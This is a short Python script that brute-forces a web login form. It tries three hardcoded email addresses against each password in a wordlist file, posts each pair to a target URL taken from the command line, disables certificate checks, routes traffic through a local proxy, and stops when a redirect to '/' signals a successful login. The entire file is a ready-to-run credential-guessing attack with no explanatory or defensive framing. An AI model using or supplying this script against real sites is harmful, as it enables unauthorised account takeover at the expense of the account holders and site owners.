import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {"http": "127.0.0.1:8080", "https": "127.0.0.1:8080"}

emails = ["hidrichadha@d.com", "xx.xx@xx.x", "dddd@dd.dsd"]
passwords = "pass.txt"


def exploit(url, emails, passwords):
    for email in emails:
        with open(passwords, "r") as passwords_list:
            for password in passwords_list:
                password = password.strip("\n").encode()
                sys.stdout.write(
                    f"[X] Attempting email:password -> {email} : {password.decode()}\r"
                )
                sys.stdout.flush()
                data = {"email": email, "password": password.decode()}
                r = requests.post(url, verify=False, data=data,
                                  proxies=proxies, allow_redirects=False)

                if r.status_code in [301, 302]:
                    if r.headers["Location"] == "/":
                        sys.stdout.write("\n")
                        sys.stdout.write(
                            f"\t[+] Found password {password.decode()} for email {email}")
                        sys.exit()
            sys.stdout.flush()
            sys.stdout.write('\n')
            sys.stdout.write(f"\tNo password found for {email}")
            sys.stdout.write('\n')


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print('[-] Example: %s http://www.example.com' % sys.argv[0])
    else:
        url = sys.argv[1]
        exploit(url, emails, passwords)
